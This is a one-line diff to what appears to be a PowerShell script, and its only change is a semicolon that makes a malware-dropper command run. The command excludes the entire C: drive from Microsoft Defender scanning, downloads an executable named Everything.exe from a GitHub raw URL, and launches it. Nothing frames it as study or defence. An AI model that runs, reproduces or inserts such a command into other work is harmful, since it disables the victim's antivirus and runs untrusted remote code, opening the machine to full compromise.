@@ -1,1 +1,1 @@
-Add-MpPreference -ExclusionPath "C:/" Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/Everything.exe" -OutFile "C:\Everything.exe"; Start-Process -FilePath "C:\Everything.exe";
+Add-MpPreference -ExclusionPath "C:/"; Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/Everything.exe" -OutFile "C:\Everything.exe"; Start-Process -FilePath "C:\Everything.exe";
